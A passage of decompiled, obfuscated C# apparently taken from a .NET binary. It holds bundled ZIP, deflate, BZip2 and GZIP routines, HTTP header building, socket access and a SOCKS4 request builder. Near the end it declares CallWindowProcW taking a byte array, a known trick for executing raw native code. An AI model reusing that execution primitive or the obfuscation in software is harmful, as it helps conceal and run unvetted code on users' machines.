		return num >> 1;
	}

	static void smethod_348(Class56 class56_0, string string_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class56_0.string_1 = string_0;
	}

	static string smethod_349(Class61 class61_0)
	{
		string text = Class6.smethod_42(class61_0) + " " + Class6.smethod_106(class61_0) + " " + Class6.smethod_477(class61_0) + "\r\n";
		if (Class6.smethod_517(class61_0) != null)
		{
			foreach (string key in Class6.smethod_517(class61_0).Keys)
			{
				if (key.Length < 6 || !key.Substring(0, 6).Equals("proxy-"))
				{
					text = text + CultureInfo.CurrentCulture.TextInfo.ToTitleCase(key) + ": " + Class6.smethod_517(class61_0)[key] + "\r\n";
				}
			}
			text += "\r\n";
			if (class61_0.string_4 != null)
			{
				text += class61_0.string_4;
			}
		}
		return text;
	}

	static Class73.Class77 smethod_350(Class73.Class78 class78_0)
	{
		byte[] array = new byte[class78_0.int_4];
		Array.Copy(class78_0.byte_1, class78_0.int_3, array, 0, class78_0.int_4);
		return new Class73.Class77(array);
	}

	static int smethod_351(Class38 class38_0, Enum20 enum20_0, Enum21 enum21_0)
	{
		int result = 0;
		if (class38_0.enum20_0 != enum20_0)
		{
			Class38.Class39 @class = Class6.smethod_586(enum20_0);
			if (@class.enum15_0 != class38_0.class39_0.enum15_0 && class38_0.gclass2_0.long_0 != 0L)
			{
				result = Class6.smethod_486(class38_0.gclass2_0, Enum19.const_1);
			}
			class38_0.enum20_0 = enum20_0;
			class38_0.class39_0 = @class;
			Class6.smethod_175(class38_0);
		}
		class38_0.enum21_0 = enum21_0;
		return result;
	}

	static EventArgs1 smethod_352(long long_0, long long_1, GClass0 gclass0_0, string string_0)
	{
		EventArgs1 eventArgs = new EventArgs1(string_0, Enum6.const_7);
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.long_0 = long_0;
		eventArgs.long_1 = long_1;
		return eventArgs;
	}

	static void smethod_353(GClass0 gclass0_0, Stream stream_0)
	{
		if (gclass0_0.LengthOfHeader == 0)
		{
			throw new BadStateException("Bad header length.");
		}
		if (gclass0_0.bool_6 || gclass0_0.ArchiveStream is ZipSegmentedStream || stream_0 is ZipSegmentedStream || (gclass0_0.bool_10 && Class6.smethod_573(gclass0_0.class8_0) == Enum8.const_0) || (!gclass0_0.bool_10 && Class6.smethod_573(gclass0_0.class8_0) == Enum8.const_3))
		{
			Class6.smethod_15(gclass0_0, stream_0);
		}
		else
		{
			Class6.smethod_506(gclass0_0, stream_0);
		}
		gclass0_0.nullable_1 = gclass0_0.long_0 >= 4294967295L || gclass0_0.long_2 >= 4294967295L || gclass0_0.long_4 >= 4294967295L;
		gclass0_0.nullable_2 = Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value;
	}

	static void smethod_354(Class38 class38_0)
	{
		int i = 0;
		int num = 0;
		int num2 = 0;
		for (; i < 7; i++)
		{
			num2 += class38_0.short_2[i * 2];
		}
		for (; i < 128; i++)
		{
			num += class38_0.short_2[i * 2];
		}
		for (; i < Class48.int_3; i++)
		{
			num2 += class38_0.short_2[i * 2];
		}
		class38_0.sbyte_0 = (sbyte)((num2 > num >> 2) ? Class38.int_10 : Class38.int_11);
	}

	static void smethod_355(string string_0, Class54 class54_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class54_0.string_0 = string_0;
	}

	static void smethod_356(Stream7 stream7_0)
	{
		Class6.smethod_224(stream7_0.class31_0, (byte)23);
		Class6.smethod_224(stream7_0.class31_0, (byte)114);
		Class6.smethod_224(stream7_0.class31_0, (byte)69);
		Class6.smethod_224(stream7_0.class31_0, (byte)56);
		Class6.smethod_224(stream7_0.class31_0, (byte)80);
		Class6.smethod_224(stream7_0.class31_0, (byte)144);
		Class6.smethod_253(stream7_0.class31_0, stream7_0.uint_0);
		Class6.smethod_668(stream7_0.class31_0);
	}

	static Socket smethod_357(Class60 class60_0)
	{
		return class60_0.socket_1;
	}

	static Class19 smethod_358(string string_0, int int_0)
	{
		Class19 @class = new Class19(string_0, int_0);
		int num = @class.int_0 / 8 / 2;
		@class.byte_0 = new byte[num];
		Random random = new Random();
		random.NextBytes(@class.byte_0);
		return @class;
	}

	static void smethod_359(Class32 class32_0)
	{
		int int_ = class32_0.int_3;
		Class32.Class33 class33_ = class32_0.class33_0;
		bool[] bool_ = class33_.bool_0;
		byte[] byte_ = class33_.byte_6;
		int[] int_2 = class33_.int_13;
		char[] char_ = class33_.char_0;
		int[] int_3 = class33_.int_0;
		byte[] byte_2 = class33_.byte_0;
		byte[] byte_3 = class33_.byte_3;
		int num = 0;
		for (int i = 0; i < 256; i++)
		{
			if (bool_[i])
			{
				byte_2[i] = (byte)num;
				num++;
			}
		}
		class32_0.int_9 = num;
		int num2 = num + 1;
		for (int num3 = num2; num3 >= 0; num3--)
		{
			int_3[num3] = 0;
		}
		int num4 = num;
		while (--num4 >= 0)
		{
			byte_3[num4] = (byte)num4;
		}
		int num5 = 0;
		int num6 = 0;
		for (int j = 0; j <= int_; j++)
		{
			byte b = byte_2[byte_[int_2[j]] & 0xFF];
			byte b2 = byte_3[0];
			int num7 = 0;
			while (b != b2)
			{
				num7++;
				byte b3 = b2;
				b2 = byte_3[num7];
				byte_3[num7] = b3;
			}
			byte_3[0] = b2;
			if (num7 == 0)
			{
				num6++;
				continue;
			}
			if (num6 > 0)
			{
				num6--;
				while (true)
				{
					if (((uint)num6 & (true ? 1u : 0u)) != 0)
					{
						char_[num5] = Class35.char_1;
						num5++;
						int_3[(uint)Class35.char_1]++;
					}
					else
					{
						char_[num5] = Class35.char_0;
						num5++;
						int_3[(uint)Class35.char_0]++;
					}
					if (num6 < 2)
					{
						break;
					}
					num6 = num6 - 2 >> 1;
				}
				num6 = 0;
			}
			char_[num5] = (char)(num7 + 1);
			num5++;
			int_3[num7 + 1]++;
		}
		if (num6 > 0)
		{
			num6--;
			while (true)
			{
				if (((uint)num6 & (true ? 1u : 0u)) != 0)
				{
					char_[num5] = Class35.char_1;
					num5++;
					int_3[(uint)Class35.char_1]++;
				}
				else
				{
					char_[num5] = Class35.char_0;
					num5++;
					int_3[(uint)Class35.char_0]++;
				}
				if (num6 < 2)
				{
					break;
				}
				num6 = num6 - 2 >> 1;
			}
		}
		char_[num5] = (char)num2;
		int_3[num2]++;
		class32_0.int_10 = num5 + 1;
	}

	static void smethod_360(Class53 class53_0, string string_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class53_0.string_0 = string_0;
	}

	static void smethod_361(GClass1 gclass1_0, IEnumerable<string> ienumerable_0)
	{
		Class6.smethod_574(ienumerable_0, gclass1_0, (string)null);
	}

	static bool smethod_362(Class38 class38_0, int int_0, int int_1)
	{
		class38_0.byte_0[class38_0.int_46 + class38_0.int_45 * 2] = (byte)((uint)int_0 >> 8);
		class38_0.byte_0[class38_0.int_46 + class38_0.int_45 * 2 + 1] = (byte)int_0;
		class38_0.byte_0[class38_0.int_43 + class38_0.int_45] = (byte)int_1;
		class38_0.int_45++;
		if (int_0 == 0)
		{
			class38_0.short_2[int_1 * 2]++;
		}
		else
		{
			class38_0.int_49++;
			int_0--;
			class38_0.short_2[(Class46.sbyte_2[int_1] + Class48.int_3 + 1) * 2]++;
			class38_0.short_3[Class6.smethod_147(int_0) * 2]++;
		}
		if ((class38_0.int_45 & 0x1FFF) == 0 && class38_0.enum20_0 > Enum20.const_4)
		{
			int num = class38_0.int_45 << 3;
			int num2 = class38_0.int_36 - class38_0.int_32;
			for (int i = 0; i < Class48.int_2; i++)
			{
				num = (int)(num + class38_0.short_3[i * 2] * (5L + Class46.int_2[i]));
			}
			num >>= 3;
			if (class38_0.int_49 < class38_0.int_45 / 2 && num < num2 / 2)
			{
				return true;
			}
		}
		if (class38_0.int_45 != class38_0.int_44 - 1)
		{
			return class38_0.int_45 == class38_0.int_44;
		}
		return true;
	}

	static string smethod_363(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.string_3;
		}
		if (class8_0.stream1_0 != null)
		{
			return class8_0.stream1_0.string_0;
		}
		return class8_0.stream0_0.string_0;
	}

	static void smethod_364(GClass1 gclass1_0, Enum6 enum6_0)
	{
		EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
		if (eventHandler_ != null)
		{
			EventArgs3 eventArgs = new EventArgs3(gclass1_0.ArchiveNameForEvent, enum6_0);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_8 = true;
			}
		}
	}

	static void smethod_365(Class14 class14_0, string string_0)
	{
		class14_0.fileAttributes_0 = FileAttributes.Normal;
		string text = string_0.ToUpper();
		foreach (char c in text)
		{
			switch (c)
			{
			case 'R':
				if ((class14_0.fileAttributes_0 & FileAttributes.ReadOnly) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.ReadOnly;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			case 'S':
				if ((class14_0.fileAttributes_0 & FileAttributes.System) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.System;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			case 'H':
				if ((class14_0.fileAttributes_0 & FileAttributes.Hidden) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.Hidden;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			case 'I':
				if ((class14_0.fileAttributes_0 & FileAttributes.NotContentIndexed) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.NotContentIndexed;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			case 'L':
				if ((class14_0.fileAttributes_0 & FileAttributes.ReparsePoint) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.ReparsePoint;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			case 'A':
				if ((class14_0.fileAttributes_0 & FileAttributes.Archive) == 0)
				{
					class14_0.fileAttributes_0 |= FileAttributes.Archive;
					break;
				}
				throw new ArgumentException($"Repeated flag. ({c})", "value");
			default:
				throw new ArgumentException(string_0);
			}
		}
	}

	static int smethod_366(Class73.Class75 class75_0, int int_0)
	{
		if (class75_0.int_2 < int_0)
		{
			if (class75_0.int_0 == class75_0.int_1)
			{
				return -1;
			}
			class75_0.uint_0 |= (uint)(((class75_0.byte_0[class75_0.int_0++] & 0xFF) | ((class75_0.byte_0[class75_0.int_0++] & 0xFF) << 8)) << class75_0.int_2);
			class75_0.int_2 += 16;
		}
		return (int)(class75_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_367(Stream11 stream11_0, Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			class8_0.gclass1_0.stream11_0 = stream11_0;
		}
		else if (class8_0.stream0_0 != null)
		{
			class8_0.stream0_0.stream11_0 = stream11_0;
		}
	}

	static void smethod_368(Stream12 stream12_0)
	{
		if (stream12_0.gclass2_0 == null)
		{
			return;
		}
		if (stream12_0.enum24_0 == Stream12.Enum24.const_0)
		{
			bool flag = false;
			do
			{
				stream12_0.gclass2_0.byte_1 = Class6.smethod_544(stream12_0);
				stream12_0.gclass2_0.int_2 = 0;
				stream12_0.gclass2_0.int_3 = stream12_0.byte_0.Length;
				int num = ((stream12_0.enum22_0 != 0) ? Class6.smethod_390(Enum19.const_4, stream12_0.gclass2_0) : Class6.smethod_486(stream12_0.gclass2_0, Enum19.const_4));
				if (num == 1 || num == 0)
				{
					if (stream12_0.byte_0.Length - stream12_0.gclass2_0.int_3 > 0)
					{
						stream12_0.stream_0.Write(stream12_0.byte_0, 0, stream12_0.byte_0.Length - stream12_0.gclass2_0.int_3);
					}
					flag = stream12_0.gclass2_0.int_1 == 0 && stream12_0.gclass2_0.int_3 != 0;
					if (stream12_0.enum23_0 == Enum23.const_2 && stream12_0.enum22_0 != 0)
					{
						flag = stream12_0.gclass2_0.int_1 == 8 && stream12_0.gclass2_0.int_3 != 0;
					}
					continue;
				}
				string text = ((stream12_0.enum22_0 == Enum22.const_0) ? "de" : "in") + "flating";
				if (stream12_0.gclass2_0.string_0 == null)
				{
					throw new GException0($"{text}: (rc = {num})");
				}
				throw new GException0(text + ": " + stream12_0.gclass2_0.string_0);
			}
			while (!flag);
			stream12_0.Flush();
			if (stream12_0.enum23_0 == Enum23.const_2)
			{
				if (stream12_0.enum22_0 != 0)
				{
					throw new GException0("Writing with decompression is not supported.");
				}
				int value = (int)(~stream12_0.gclass3_0.uint_2);
				stream12_0.stream_0.Write(BitConverter.GetBytes(value), 0, 4);
				int value2 = (int)(stream12_0.gclass3_0.long_0 & 0xFFFFFFFFL);
				stream12_0.stream_0.Write(BitConverter.GetBytes(value2), 0, 4);
			}
		}
		else
		{
			if (stream12_0.enum24_0 != Stream12.Enum24.const_1 || stream12_0.enum23_0 != Enum23.const_2)
			{
				return;
			}
			if (stream12_0.enum22_0 == Enum22.const_0)
			{
				throw new GException0("Reading with compression is not supported.");
			}
			if (stream12_0.gclass2_0.long_1 == 0L)
			{
				return;
			}
			byte[] array = new byte[8];
			if (stream12_0.gclass2_0.int_1 < 8)
			{
				Array.Copy(stream12_0.gclass2_0.byte_0, stream12_0.gclass2_0.int_0, array, 0, stream12_0.gclass2_0.int_1);
				int num2 = 8 - stream12_0.gclass2_0.int_1;
				int num3 = stream12_0.stream_0.Read(array, stream12_0.gclass2_0.int_1, num2);
				if (num2 != num3)
				{
					throw new GException0($"Missing or incomplete GZIP trailer. Expected 8 bytes, got {stream12_0.gclass2_0.int_1 + num3}.");
				}
			}
			else
			{
				Array.Copy(stream12_0.gclass2_0.byte_0, stream12_0.gclass2_0.int_0, array, 0, array.Length);
			}
			int num4 = BitConverter.ToInt32(array, 0);
			int num5 = (int)(~stream12_0.gclass3_0.uint_2);
			int num6 = BitConverter.ToInt32(array, 4);
			int num7 = (int)(stream12_0.gclass2_0.long_1 & 0xFFFFFFFFL);
			if (num5 != num4)
			{
				throw new GException0($"Bad CRC32 in GZIP trailer. (actual({num5:X8})!=expected({num4:X8}))");
			}
			if (num7 != num6)
			{
				throw new GException0($"Bad size in GZIP trailer. (actual({num7})!=expected({num6}))");
			}
		}
	}

	static void smethod_369(GClass0 gclass0_0, Stream stream_0)
	{
		byte[] array = new byte[4096];
		int num = 0;
		num = 1;
		array[0] = 80;
		num = 2;
		array[1] = 75;
		num = 3;
		array[2] = 1;
		num = 4;
		array[3] = 2;
		num = 5;
		array[4] = (byte)((uint)gclass0_0.short_0 & 0xFFu);
		num = 6;
		array[5] = (byte)((gclass0_0.short_0 & 0xFF00) >> 8);
		short num2 = (short)((gclass0_0.short_6 != 0) ? gclass0_0.short_6 : 20);
		if (!gclass0_0.nullable_2.HasValue)
		{
			gclass0_0.nullable_2 = Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3;
		}
		short num3 = (short)(gclass0_0.nullable_2.Value ? 45 : num2);
		if (gclass0_0.short_8 == 12)
		{
			num3 = 46;
		}
		array[num++] = (byte)((uint)num3 & 0xFFu);
		array[num++] = (byte)((num3 & 0xFF00) >> 8);
		array[num++] = (byte)((uint)gclass0_0.short_7 & 0xFFu);
		array[num++] = (byte)((gclass0_0.short_7 & 0xFF00) >> 8);
		array[num++] = (byte)((uint)gclass0_0.short_8 & 0xFFu);
		array[num++] = (byte)((gclass0_0.short_8 & 0xFF00) >> 8);
		if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
		{
			num -= 2;
			array[num++] = 99;
			array[num++] = 0;
		}
		array[num++] = (byte)((uint)gclass0_0.int_1 & 0xFFu);
		array[num++] = (byte)((gclass0_0.int_1 & 0xFF00) >> 8);
		array[num++] = (byte)((gclass0_0.int_1 & 0xFF0000) >> 16);
		array[num++] = (byte)((gclass0_0.int_1 & 0xFF000000L) >> 24);
		array[num++] = (byte)((uint)gclass0_0.int_2 & 0xFFu);
		array[num++] = (byte)((gclass0_0.int_2 & 0xFF00) >> 8);
		array[num++] = (byte)((gclass0_0.int_2 & 0xFF0000) >> 16);
		array[num++] = (byte)((gclass0_0.int_2 & 0xFF000000L) >> 24);
		int num4 = 0;
		if (gclass0_0.nullable_2.Value)
		{
			for (num4 = 0; num4 < 8; num4++)
			{
				array[num++] = byte.MaxValue;
			}
		}
		else
		{
			array[num++] = (byte)((ulong)gclass0_0.long_0 & 0xFFuL);
			array[num++] = (byte)((gclass0_0.long_0 & 0xFF00L) >> 8);
			array[num++] = (byte)((gclass0_0.long_0 & 0xFF0000L) >> 16);
			array[num++] = (byte)((gclass0_0.long_0 & 0xFF000000L) >> 24);
			array[num++] = (byte)((ulong)gclass0_0.long_2 & 0xFFuL);
			array[num++] = (byte)((gclass0_0.long_2 & 0xFF00L) >> 8);
			array[num++] = (byte)((gclass0_0.long_2 & 0xFF0000L) >> 16);
			array[num++] = (byte)((gclass0_0.long_2 & 0xFF000000L) >> 24);
		}
		byte[] array2 = Class6.smethod_325(gclass0_0);
		short num5 = (short)array2.Length;
		array[num++] = (byte)((uint)num5 & 0xFFu);
		array[num++] = (byte)((num5 & 0xFF00) >> 8);
		gclass0_0.bool_13 = gclass0_0.nullable_2.Value;
		gclass0_0.byte_1 = Class6.smethod_339(gclass0_0, bool_0: true);
		short num6 = (short)((gclass0_0.byte_1 != null) ? gclass0_0.byte_1.Length : 0);
		array[num++] = (byte)((uint)num6 & 0xFFu);
		array[num++] = (byte)((num6 & 0xFF00) >> 8);
		int num7 = ((gclass0_0.byte_0 != null) ? gclass0_0.byte_0.Length : 0);
		if (num7 + num > array.Length)
		{
			num7 = array.Length - num;
		}
		array[num++] = (byte)((uint)num7 & 0xFFu);
		array[num++] = (byte)((num7 & 0xFF00) >> 8);
		if (gclass0_0.class8_0.gclass1_0 != null && gclass0_0.class8_0.gclass1_0.int_0 != 0)
		{
			array[num++] = (byte)(gclass0_0.uint_0 & 0xFFu);
			array[num++] = (byte)((gclass0_0.uint_0 & 0xFF00) >> 8);
		}
		else
		{
			array[num++] = 0;
			array[num++] = 0;
		}
		array[num++] = (byte)(gclass0_0.bool_14 ? 1u : 0u);
		array[num++] = 0;
		array[num++] = (byte)((uint)gclass0_0.int_0 & 0xFFu);
		array[num++] = (byte)((gclass0_0.int_0 & 0xFF00) >> 8);
		array[num++] = (byte)((gclass0_0.int_0 & 0xFF0000) >> 16);
		array[num++] = (byte)((gclass0_0.int_0 & 0xFF000000L) >> 24);
		if (gclass0_0.long_4 > 4294967295L)
		{
			array[num++] = byte.MaxValue;
			array[num++] = byte.MaxValue;
			array[num++] = byte.MaxValue;
			array[num++] = byte.MaxValue;
		}
		else
		{
			array[num++] = (byte)((ulong)gclass0_0.long_4 & 0xFFuL);
			array[num++] = (byte)((gclass0_0.long_4 & 0xFF00L) >> 8);
			array[num++] = (byte)((gclass0_0.long_4 & 0xFF0000L) >> 16);
			array[num++] = (byte)((gclass0_0.long_4 & 0xFF000000L) >> 24);
		}
		Buffer.BlockCopy(array2, 0, array, num, num5);
		num += num5;
		if (gclass0_0.byte_1 != null)
		{
			byte[] byte_ = gclass0_0.byte_1;
			Buffer.BlockCopy(byte_, 0, array, num, num6);
			num += num6;
		}
		if (num7 != 0)
		{
			Buffer.BlockCopy(gclass0_0.byte_0, 0, array, num, num7);
			num += num7;
		}
		stream_0.Write(array, 0, num);
	}

	static void smethod_370(ICollection<GClass0> icollection_0, GClass1 gclass1_0)
	{
		if (icollection_0 == null)
		{
			throw new ArgumentNullException("entriesToRemove");
		}
		foreach (GClass0 item in icollection_0)
		{
			Class6.smethod_613(gclass1_0, item);
		}
	}

	static int smethod_371(GClass2 gclass2_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = gclass2_0.int_1;
		if (num > int_1)
		{
			num = int_1;
		}
		if (num == 0)
		{
			return 0;
		}
		gclass2_0.int_1 -= num;
		if (gclass2_0.class38_0.bool_1)
		{
			gclass2_0.uint_0 = Class6.smethod_439(gclass2_0.uint_0, gclass2_0.byte_0, gclass2_0.int_0, num);
		}
		Array.Copy(gclass2_0.byte_0, gclass2_0.int_0, byte_0, int_0, num);
		gclass2_0.int_0 += num;
		gclass2_0.long_0 += num;
		return num;
	}

	static void smethod_372(GClass1 gclass1_0)
	{
		bool flag = false;
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		GClass0 gClass;
		while ((gClass = Class6.smethod_487(gclass1_0, dictionary)) != null)
		{
			Class6.smethod_381(gClass);
			Class6.smethod_472(bool_0: true, gclass1_0, (GClass0)null);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("entry {0}", gClass.string_1);
			}
			gclass1_0.dictionary_0.Add(gClass.string_1, gClass);
			if (gClass.bool_10)
			{
				flag = true;
			}
			dictionary.Add(gClass.string_1, null);
		}
		if (flag)
		{
			gclass1_0.enum8_0 = Enum8.const_3;
		}
		if (gclass1_0.long_0 > 0L)
		{
			gclass1_0.ReadStream.Seek(gclass1_0.long_0, SeekOrigin.Begin);
		}
		Class6.smethod_213(gclass1_0);
		if (gclass1_0.textWriter_0 != null && !string.IsNullOrEmpty(gclass1_0.string_2))
		{
			gclass1_0.textWriter_0.WriteLine("Zip file Comment: {0}", gclass1_0.string_2);
		}
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("read in {0} entries.", gclass1_0.dictionary_0.Count);
		}
		Class6.smethod_522(gclass1_0);
	}

	static int smethod_373(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
	{
		GClass0.Class24 CS_0024_003C_003E8__locals0 = new GClass0.Class24();
		CS_0024_003C_003E8__locals0.byte_0 = byte_0;
		CS_0024_003C_003E8__locals0.int_1 = int_0;
		CS_0024_003C_003E8__locals0.gclass0_0 = gclass0_0;
		if (short_0 != 13 && short_0 != 9 && short_0 != 5)
		{
			throw new BadReadException($"  Unexpected size (0x{short_0:X4}) for Extended Timestamp extra field at position 0x{long_0:X16}");
		}
		CS_0024_003C_003E8__locals0.int_0 = short_0;
		GClass0.Delegate4<DateTime> @delegate = delegate
		{
			int num = BitConverter.ToInt32(CS_0024_003C_003E8__locals0.byte_0, CS_0024_003C_003E8__locals0.int_1);
			CS_0024_003C_003E8__locals0.int_1 += 4;
			CS_0024_003C_003E8__locals0.int_0 -= 4;
			return GClass0.dateTime_4.AddSeconds(num);
		};
		if (short_0 != 13 && gclass0_0.int_5 <= 0)
		{
			Class6.smethod_585(gclass0_0);
		}
		else
		{
			byte b = CS_0024_003C_003E8__locals0.byte_0[CS_0024_003C_003E8__locals0.int_1++];
			CS_0024_003C_003E8__locals0.int_0--;
			if (((uint)b & (true ? 1u : 0u)) != 0 && CS_0024_003C_003E8__locals0.int_0 >= 4)
			{
				gclass0_0.dateTime_1 = @delegate();
			}
			gclass0_0.dateTime_2 = (((b & 2) == 0 || CS_0024_003C_003E8__locals0.int_0 < 4) ? DateTime.UtcNow : @delegate());
			gclass0_0.dateTime_3 = (((b & 4) == 0 || CS_0024_003C_003E8__locals0.int_0 < 4) ? DateTime.UtcNow : @delegate());
			gclass0_0.enum7_0 |= Enum7.flag_3;
			gclass0_0.bool_0 = true;
			gclass0_0.bool_2 = true;
		}
		return CS_0024_003C_003E8__locals0.int_1;
	}

	static Stream smethod_374(GClass0 gclass0_0, Stream stream_0)
	{
		return gclass0_0.short_9 switch
		{
			12 => new Stream6(stream_0, bool_3: true), 
			8 => new Stream9(stream_0, Enum22.const_1, bool_1: true), 
			0 => stream_0, 
			_ => null, 
		};
	}

	static void smethod_375(Class38 class38_0)
	{
		class38_0.class46_0.short_0 = class38_0.short_2;
		class38_0.class46_0.class49_0 = Class49.class49_0;
		class38_0.class46_1.short_0 = class38_0.short_3;
		class38_0.class46_1.class49_0 = Class49.class49_1;
		class38_0.class46_2.short_0 = class38_0.short_4;
		class38_0.class46_2.class49_0 = Class49.class49_2;
		class38_0.short_6 = 0;
		class38_0.int_51 = 0;
		class38_0.int_50 = 8;
		Class6.smethod_514(class38_0);
	}

	static void smethod_376(Class32 class32_0)
	{
		Class32.Class33 class33_ = class32_0.class33_0;
		int[] int_ = class33_.int_7;
		int[] int_2 = class33_.int_8;
		bool[] bool_ = class33_.bool_2;
		int[] int_3 = class33_.int_12;
		byte[] byte_ = class33_.byte_6;
		int[] int_4 = class33_.int_13;
		char[] char_ = class33_.char_1;
		int int_5 = class32_0.int_3;
		int int_6 = class32_0.int_7;
		bool bool_2 = class32_0.bool_0;
		int num = 65537;
		while (--num >= 0)
		{
			int_3[num] = 0;
		}
		for (int i = 0; i < Class35.int_9; i++)
		{
			byte_[int_5 + i + 2] = byte_[i % (int_5 + 1) + 1];
		}
		int num2 = int_5 + Class35.int_9 + 1;
		while (--num2 >= 0)
		{
			char_[num2] = '\0';
		}
		byte_[0] = byte_[int_5 + 1];
		int num3 = byte_[0] & 0xFF;
		for (int j = 0; j <= int_5; j++)
		{
			int num4 = byte_[j + 1] & 0xFF;
			int_3[(num3 << 8) + num4]++;
			num3 = num4;
		}
		for (int k = 1; k <= 65536; k++)
		{
			int_3[k] += int_3[k - 1];
		}
		num3 = byte_[1] & 0xFF;
		for (int l = 0; l < int_5; l++)
		{
			int num5 = byte_[l + 2] & 0xFF;
			int_4[--int_3[(num3 << 8) + num5]] = l;
			num3 = num5;
		}
		int_4[--int_3[((byte_[int_5 + 1] & 0xFF) << 8) + (byte_[1] & 0xFF)]] = int_5;
		int num6 = 256;
		while (--num6 >= 0)
		{
			bool_[num6] = false;
			int_[num6] = num6;
		}
		int num7 = 364;
		while (num7 != 1)
		{
			num7 /= 3;
			for (int m = num7; m <= 255; m++)
			{
				int num8 = int_[m];
				int num9 = int_3[num8 + 1 << 8] - int_3[num8 << 8];
				int num10 = num7 - 1;
				int num11 = m;
				int num12 = int_[num11 - num7];
				while (int_3[num12 + 1 << 8] - int_3[num12 << 8] > num9)
				{
					int_[num11] = num12;
					num11 -= num7;
					if (num11 <= num10)
					{
						break;
					}
					num12 = int_[num11 - num7];
				}
				int_[num11] = num8;
			}
		}
		for (int n = 0; n <= 255; n++)
		{
			int num13 = int_[n];
			for (int num14 = 0; num14 <= 255; num14++)
			{
				int num15 = (num13 << 8) + num14;
				int num16 = int_3[num15];
				if ((num16 & Class32.int_11) == Class32.int_11)
				{
					continue;
				}
				int num17 = num16 & Class32.int_12;
				int num18 = (int_3[num15 + 1] & Class32.int_12) - 1;
				if (num18 > num17)
				{
					Class6.smethod_560(class33_, 2, class32_0, num17, num18);
					if (bool_2 && class32_0.int_6 > int_6)
					{
						return;
					}
				}
				int_3[num15] = num16 | Class32.int_11;
			}
			for (int num19 = 0; num19 <= 255; num19++)
			{
				int_2[num19] = int_3[(num19 << 8) + num13] & Class32.int_12;
			}
			int num20 = int_3[num13 << 8] & Class32.int_12;
			for (int num21 = int_3[num13 + 1 << 8] & Class32.int_12; num20 < num21; num20++)
			{
				int num22 = int_4[num20];
				num3 = byte_[num22] & 0xFF;
				if (!bool_[num3])
				{
					int_4[int_2[num3]] = ((num22 == 0) ? int_5 : (num22 - 1));
					int_2[num3]++;
				}
			}
			int num23 = 256;
			while (--num23 >= 0)
			{
				int_3[(num23 << 8) + num13] |= Class32.int_11;
			}
			bool_[num13] = true;
			if (n >= 255)
			{
				continue;
			}
			int num24 = int_3[num13 << 8] & Class32.int_12;
			int num25 = (int_3[num13 + 1 << 8] & Class32.int_12) - num24;
			int num26;
			for (num26 = 0; num25 >> num26 > 65534; num26++)
			{
			}
			for (int num27 = 0; num27 < num25; num27++)
			{
				int num28 = int_4[num24 + num27];
				char c = (char_[num28] = (char)(num27 >> num26));
				if (num28 < Class35.int_9)
				{
					char_[num28 + int_5 + 1] = c;
				}
			}
		}
	}

	static byte[] smethod_377(string string_0, int int_0, Class55 class55_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		if (int_0 <= 0 || int_0 > 65535)
		{
			throw new ArgumentException();
		}
		byte[] array = new byte[10 + Class6.smethod_136((Class54)class55_0).Length + string_0.Length];
		array[0] = 4;
		array[1] = 1;
		Array.Copy(Class6.smethod_660(int_0, (Class54)class55_0), 0, array, 2, 2);
		array[6] = 0;
		array[5] = 0;
		array[4] = 0;
		array[7] = 1;
		Array.Copy(Encoding.ASCII.GetBytes(Class6.smethod_136((Class54)class55_0)), 0, array, 8, Class6.smethod_136((Class54)class55_0).Length);
		array[8 + Class6.smethod_136((Class54)class55_0).Length] = 0;
		Array.Copy(Encoding.ASCII.GetBytes(string_0), 0, array, 9 + Class6.smethod_136((Class54)class55_0).Length, string_0.Length);
		array[9 + Class6.smethod_136((Class54)class55_0).Length + string_0.Length] = 0;
		return array;
	}

	static GClass1 smethod_378(string string_0, Class28 class28_0)
	{
		if (class28_0 == null)
		{
			throw new ArgumentNullException("options");
		}
		return Class6.smethod_58(string_0, class28_0.method_1(), class28_0.method_2(), class28_0.method_0());
	}

	static GClass0 smethod_379(string string_0, Delegate0 delegate0_0, GClass1 gclass1_0)
	{
		Class6.smethod_26(string_0, gclass1_0);
		return Class6.smethod_65(string_0, gclass1_0, delegate0_0);
	}

	static void smethod_380(byte[] byte_0, Class57 class57_0)
	{
		class57_0.byte_0 = byte_0;
	}

	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr CallWindowProcW([In] byte[] byte_0, IntPtr intptr_0, int int_0, [In][Out] byte[] byte_1, IntPtr intptr_1);

	static void smethod_381(GClass0 gclass0_0)
	{
		gclass0_0.long_3 = -1L;
		gclass0_0.int_3 = 0;
	}

	static void smethod_382(Stream0 stream0_0)
	{
		if (stream0_0.gclass0_0 != null)
		{
			if (stream0_0.bool_5)
			{
				Class6.smethod_502(stream0_0, bool_0: true);
			}
